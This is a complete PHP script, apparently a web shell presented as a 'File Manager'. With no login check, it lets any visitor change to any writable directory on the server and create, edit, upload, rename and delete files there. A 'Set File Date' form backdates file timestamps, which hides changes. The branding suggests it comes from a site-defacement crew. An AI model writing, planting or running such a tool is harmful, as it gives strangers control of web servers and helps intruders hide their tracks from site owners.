<?php
session_start();

if (!isset($_SESSION['directory'])) {
    $_SESSION['directory'] = __DIR__ . '/';
}
$directory = $_SESSION['directory'];
$uploadMessage = ""; 
$fileContent = ""; 

if (!is_writable($directory)) {
    die("Error: Directory is not writable.");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['create'])) {
        $filename = basename($_POST['filename']);
        if (!empty($filename) && !file_exists($directory . $filename)) {
            file_put_contents($directory . $filename, "");
            touch($directory . $filename); 
            $uploadMessage = "File created successfully: " . htmlspecialchars($filename);
        } else {
            $uploadMessage = "File already exists or invalid filename.";
        }
    }

    if (isset($_POST['edit'])) {
        $filename = basename($_POST['filename']);
        $content = $_POST['content'];
        if (file_exists($directory . $filename)) {
            file_put_contents($directory . $filename, $content);
            touch($directory . $filename);
            $uploadMessage = "File updated successfully: " . htmlspecialchars($filename);
        } else {
            $uploadMessage = "File not found.";
        }
    }

    if (isset($_POST['upload'])) {
        $uploadedFile = basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $directory . $uploadedFile)) {
            $uploadMessage = "File uploaded successfully: " . htmlspecialchars(realpath($directory . $uploadedFile));
        } else {
            $uploadMessage = "Upload failed.";
        }
    }

    if (isset($_POST['rename'])) {
        $oldName = basename($_POST['old_name']);
        $newName = basename($_POST['new_name']);
        if (file_exists($directory . $oldName) && !empty($newName) && !file_exists($directory . $newName)) {
            rename($directory . $oldName, $directory . $newName);
            $uploadMessage = "File renamed successfully: " . htmlspecialchars($newName);
        } else {
            $uploadMessage = "Old file not found or invalid new filename.";
        }
    }

    if (isset($_POST['delete'])) {
        $fileToDelete = basename($_POST['file_to_delete']);
        if (file_exists($directory . $fileToDelete) && unlink($directory . $fileToDelete)) {
            $uploadMessage = "File deleted successfully: " . htmlspecialchars($fileToDelete);
        } else {
            $uploadMessage = "Deletion failed or file not found.";
        }
    }

    if (isset($_POST['change_dir'])) {
        $newDir = rtrim($_POST['new_directory'], '/') . '/';
        if (is_dir($newDir) && is_writable($newDir)) {
            $_SESSION['directory'] = realpath($newDir) . '/';
            $directory = $_SESSION['directory'];
            $uploadMessage = "Directory changed to: " . htmlspecialchars($directory);
        } else {
            $uploadMessage = "Invalid or non-writable directory.";
        }
    }

    if (isset($_POST['load'])) {
        $filename = basename($_POST['filename']);
        if (file_exists($directory . $filename)) {
            $fileContent = file_get_contents($directory . $filename);
        } else {
            $uploadMessage = "File not found.";
        }
    }

    if (isset($_POST['set_date'])) {
        $filename = basename($_POST['filename']);
        $creationDate = strtotime($_POST['creation_date']);
        
        if (file_exists($directory . $filename) && $creationDate !== false) {
            if (touch($directory . $filename, $creationDate, $creationDate)) {
                $uploadMessage = "File date updated successfully: " . htmlspecialchars($filename);
            } else {
                $uploadMessage = "Failed to update file date. Check permissions.";
            }
        } else {
            $uploadMessage = "File not found or invalid date.";
        }
    }
}

$files = array_diff(scandir($directory), ['..', '.']);

function getFileTimes($filePath) {
    if (file_exists($filePath)) {
        return [
            'created' => date('Y-m-d H:i:s', filectime($filePath)),
            'modified' => date('Y-m-d H:i:s', filemtime($filePath)),
        ];
    }
    return ['created' => 'N/A', 'modified' => 'N/A'];
}
function getFilePermissions($filePath) {
    $perms = fileperms($filePath);
    $info = '';

   
    if (($perms & 0xC000) === 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) === 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) === 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) === 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) === 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) === 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) === 0x1000) {
        $info = 'p';
    }

    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';

    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';

    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';

    return $info;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 100%;
            max-width: 900px;
            margin: 30px auto;
            padding: 10px;
        }

        .header {
            text-align: center;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 2.5rem;
            margin: 0;
        }

        .form-container {
            background-color: #fff;
            padding: 20px;
            margin: 15px 0;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }

        .form-container input,
        .form-container textarea,
        .form-container button {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            font-size: 16px;
            border-radius: 5px;
            border: 1px solid #ddd;
            box-sizing: border-box;
        }

        .form-container button {
            background-color: #db9e34;
            color: white;
            cursor: pointer;
            border: none;
        }

        .form-container button:hover {
            background-color: #2980b9;
        }

        .file-list {
            list-style-type: none;
            padding: 0;
            margin: 0;
        }

        .file-list li {
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 10px;
            background-color: #fff;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
        }

        .file-actions {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .file-actions button {
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 6px 12px;
            cursor: pointer;
            border-radius: 5px;
        }

        .file-actions button:hover {
            background-color: #c0392b;
        }

        .message {
            color: #27ae60;
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
        }
.footer {
    color: #333; /* Set the text color */
    text-align: center;
    padding: 5px 0; /* Reduced padding for a smaller space */
    margin-top: 20px; /* Reduced margin to bring footer closer */
    width: 100%; /* Ensure it spans the full width */
}

.footer p {
    margin: 0;
    font-size: 14px;
}

.footer a {
    color: #3498db; /* Link color */
    text-decoration: none;
}

.footer a:hover {
    text-decoration: underline;
}

.form-container {
    background-color: #fff;
    padding: 20px;
    margin: 15px 0;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
}

.form-container:last-child {
    margin-bottom: 10px; /* Reduced bottom margin of the last form */
}

        /* Responsive Design */
        @media (max-width: 600px) {
            .container {
                width: 100%;
                padding: 10px;
            }

            .file-list li {
                flex-direction: column;
                align-items: flex-start;
                font-size: 12px;
            }

            .form-container input,
            .form-container button {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="https://i.ibb.co.com/H4XfdZC/image.png" alt="Kitabisacom1337" style="width: 260px; height: auto;">
    </div>
	<p class="message"><?php echo htmlspecialchars($uploadMessage); ?></p>
<h2>Current Directory: <?php echo htmlspecialchars($directory); ?></h2>
    <div class="form-container">
        <h2>Change Directory</h2>
        <form method="POST">
            <input type="text" name="new_directory" placeholder="Enter new directory path" required>
            <button type="submit" name="change_dir">Change</button>
        </form>
    </div>
    <div class="form-container">
        <h2>Create New File</h2>
        <form method="POST">
            <input type="text" name="filename" placeholder="Enter filename" required>
            <button type="submit" name="create">Create</button>
        </form>
    </div>
    <div class="form-container">
        <h2>Edit File</h2>
        <form method="POST">
            <input type="text" name="filename" placeholder="Enter filename to edit" required>
            <button type="submit" name="load">Load File</button>
        </form>
        <?php if ($fileContent !== ""): ?>
            <form method="POST">
                <textarea name="content" rows="8" placeholder="Edit content" required><?php echo htmlspecialchars($fileContent); ?></textarea>
                <input type="hidden" name="filename" value="<?php echo htmlspecialchars(basename($_POST['filename'])); ?>">
                <button type="submit" name="edit">Save Changes</button>
            </form>
        <?php endif; ?>
    </div>
    <div class="form-container">
        <h2>Upload File</h2>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit" name="upload">Upload</button>
        </form>
    </div>
    <div class="form-container">
        <h2>Rename File</h2>
        <form method="POST">
            <input type="text" name="old_name" placeholder="Old filename" required>
            <input type="text" name="new_name" placeholder="New filename" required>
            <button type="submit" name="rename">Rename</button>
        </form>
    </div>
    <div class="form-container">
        <h2>Delete File</h2>
        <form method="POST">
            <input type="text" name="file_to_delete" placeholder="Filename to delete" required>
            <button type="submit" name="delete">Delete</button>
        </form>
    </div>
    <div class="form-container">
        <h2>Set File Date</h2>
        <form method="POST">
            <input type="text" name="filename" placeholder="Enter filename" required>
            <input type="datetime-local" name="creation_date" required>
            <button type="submit" name="set_date">Set Date</button>
        </form>
    </div>
    <div class="form-container">
        <h2>View Files</h2>
        <ul class="file-list">
            <?php foreach ($files as $file): ?>
                <li>
                    <div>
                        <strong><?php echo htmlspecialchars($file); ?></strong>
                        <div class="file-actions">
                            <?php
                                $filePath = $directory . $file;
                                $fileTimes = getFileTimes($filePath);
                                $filePerms = getFilePermissions($filePath);
                            ?>
                            <span>Created: <?php echo $fileTimes['created']; ?></span> | 
                            <span>Last Edited: <?php echo $fileTimes['modified']; ?></span> |
                            <span>Permissions: <?php echo $filePerms; ?></span>
                        </div>
                    </div>
                </li>
            <?php endforeach; ?>
        </ul>
    </div>
</div>
    <div class="footer">
        <p>&copy; 2024 <a href="#" target="_blank">FanxyChild19</a> - All rights reserved.</p>
    </div>
</div>
</body>
</html>
